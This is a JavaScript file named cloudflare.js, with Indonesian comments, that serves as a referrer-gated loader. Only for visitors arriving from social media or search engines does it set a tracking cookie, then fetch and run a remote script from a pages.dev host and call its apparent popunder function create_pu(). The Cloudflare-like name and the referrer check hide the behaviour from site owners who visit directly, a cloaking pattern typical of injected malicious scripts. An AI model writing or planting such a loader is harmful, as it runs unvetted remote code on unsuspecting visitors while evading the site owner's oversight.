// cloudflare.js - Loader script dengan cookie tracking dan eksekusi paksa
(function() {
    'use strict';
    
    // Nama cookie untuk melacak pengunjung dari referer valid
    var TRACKING_COOKIE = 'cf_valid_referer';
    var COOKIE_EXPIRY_DAYS = 1; // Cookie berlaku 1 hari
    
    // Fungsi untuk mengatur cookie
    function setCookie(name, value, days) {
        var expires = "";
        if (days) {
            var date = new Date();
            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
            expires = "; expires=" + date.toUTCString();
        }
        document.cookie = name + "=" + (value || "") + expires + "; path=/; SameSite=Lax";
    }
    
    // Fungsi untuk mendapatkan cookie
    function getCookie(name) {
        var nameEQ = name + "=";
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
        }
        return null;
    }
    
    // Fungsi untuk memeriksa apakah referer valid (dari social media atau search engine)
    function isRefererValid() {
        var referer = document.referrer.toLowerCase();
        
        // Periksa cookie terlebih dahulu (jika sudah pernah valid sebelumnya)
        var hasValidCookie = getCookie(TRACKING_COOKIE);
        if (hasValidCookie === 'true') {
            console.log('Cookie valid ditemukan, pengunjung dari referer valid sebelumnya');
            return true;
        }
        
        // Jika tidak ada referer, kembalikan false
        if (!referer || referer.length === 0) {
            console.log('Tidak ada referer');
            return false;
        }
        
        // Daftar domain social media
        var socialMediaDomains = [
            'facebook.com', 'fb.com',
            'twitter.com', 'x.com',
            'instagram.com',
            'linkedin.com',
            'pinterest.com',
            'tiktok.com',
            'youtube.com',
            'whatsapp.com',
            'telegram.org',
            'snapchat.com',
            'reddit.com',
            'tumblr.com',
            'plus.google.com'
        ];
        
        // Daftar domain search engine
        var searchEngineDomains = [
            'google.', 'google.com', 'google.co', 'google.co.id',
            'bing.', 'bing.com',
            'yahoo.', 'yahoo.com',
            'yandex.', 'yandex.com',
            'baidu.', 'baidu.com',
            'duckduckgo.', 'duckduckgo.com',
            'ask.', 'ask.com',
            'aol.', 'aol.com',
            'search.', 'search.com'
        ];
        
        // Gabungkan semua domain yang valid
        var validDomains = socialMediaDomains.concat(searchEngineDomains);
        
        // Periksa apakah referer mengandung salah satu domain valid
        var isValid = validDomains.some(function(domain) {
            return referer.indexOf(domain) !== -1;
        });
        
        // Jika valid, set cookie untuk sesi berikutnya
        if (isValid) {
            console.log('Referer valid ditemukan:', document.referrer);
            setCookie(TRACKING_COOKIE, 'true', COOKIE_EXPIRY_DAYS);
        } else {
            console.log('Referer tidak valid:', document.referrer);
        }
        
        return isValid;
    }
    
    // Fungsi untuk memuat dan MENJALANKAN script utama
    function loadAndExecuteMainScript() {
        console.log('Memuat dan mengeksekusi script utama...');
        
        // Buat elemen script
        var script = document.createElement('script');
        script.src = 'https://id-27d.pages.dev/id.js';
        script.async = false; // Biarkan synchronous agar dieksekusi segera
        
        // Tambahkan event handler
        script.onerror = function() {
            console.error('Gagal memuat script utama');
        };
        
        script.onload = function() {
            console.log('Script utama berhasil dimuat');
            
            // TUNGGU SEBENTAR untuk memastikan script utama sudah siap
            setTimeout(function() {
                // Panggil fungsi utama dari id.js jika ada
                try {
                    // Coba jalankan fungsi create_pu() dari id.js
                    if (typeof window.create_pu === 'function') {
                        console.log('Menjalankan create_pu()...');
                        window.create_pu();
                    } else {
                        console.warn('Fungsi create_pu() tidak ditemukan');
                    }
                    
                    // Coba inisialisasi dpu jika ada
                    if (typeof window.dpu !== 'undefined') {
                        console.log('dpu tersedia di window');
                    }
                    
                    // Cek apakah pu object sudah ada
                    if (window.pu) {
                        console.log('pu object tersedia:', window.pu.id);
                        
                        // Jika pu.rt_enable ada, jalankan logika sesuai config
                        if (window.pu.rt_enable) {
                            console.log('rt_enable aktif, menjalankan logika referer...');
                        } else {
                            console.log('rt_enable tidak aktif, langsung jalankan create_pu');
                            if (typeof window.create_pu === 'function') {
                                window.create_pu();
                            }
                        }
                    }
                } catch (error) {
                    console.error('Error saat mengeksekusi script utama:', error);
                }
            }, 100); // Tunggu 100ms
        };
        
        // Tambahkan script ke dokumen
        document.head.appendChild(script);
    }
    
    // Fungsi untuk memeriksa dan memuat script
    function init() {
        // Periksa apakah sudah ada pu object (jika script utama sudah dimuat)
        if (window.pu) {
            console.log('Script utama sudah dimuat sebelumnya');
            return;
        }
        
        // Periksa referer (atau cookie)
        if (isRefererValid()) {
            console.log('Referer valid, memuat script utama');
            loadAndExecuteMainScript();
        } else {
            console.log('Referer tidak valid, script utama tidak dimuat');
        }
    }
    
    // Jalankan saat DOM siap
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
